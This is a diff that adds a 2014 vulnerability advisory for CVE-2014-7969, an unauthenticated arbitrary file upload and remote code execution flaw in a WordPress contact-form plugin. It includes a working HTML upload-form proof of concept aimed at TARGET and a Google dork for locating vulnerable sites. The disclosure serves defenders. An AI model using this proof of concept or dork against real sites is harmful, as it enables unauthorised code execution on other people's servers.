@@ -1,0 +1,37 @@
+==========================================================
+"Creative Contact Form - The Best WordPress Contact Form Builder" -
+Arbitrary File Upload
+
+# Author: Gianni Angelozzi
+# Date: 08/10/2014
+# Remote: Yes
+# Vendor Homepage: https://profiles.wordpress.org/creative-solutions-1/
+# Software Link: https://wordpress.org/plugins/sexy-contact-form/
+# CVE: CVE-2014-7969
+# Version: all including latest 0.9.7
+# Google Dork: inurl:"wp-content/plugins/sexy-contact-form"
+
+This plugin includes a PHP script to accept file uploads that doesn't
+perform any security check, thus allowing unauthenticated remote file
+upload, leading to remote code execution. All versions are affected.
+Uploaded files are stored with their original file name.
+==========================================================
+PoC
+==========================================================
+Trigger a file upload
+
+<form method="POST" action="
+http://TARGET/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php"
+enctype="multipart/form-data">
+<input type="file" name="files[]" /><button>Upload</button>
+</form>
+Then the file is accessible under
+
+http://TARGET/wp-content/plugins/sexy-contact-form/includes/fileupload/files/FILENAME
+==========================================================
+EOF
+
+
+Thanks,
+
+Gianni Angelozzi
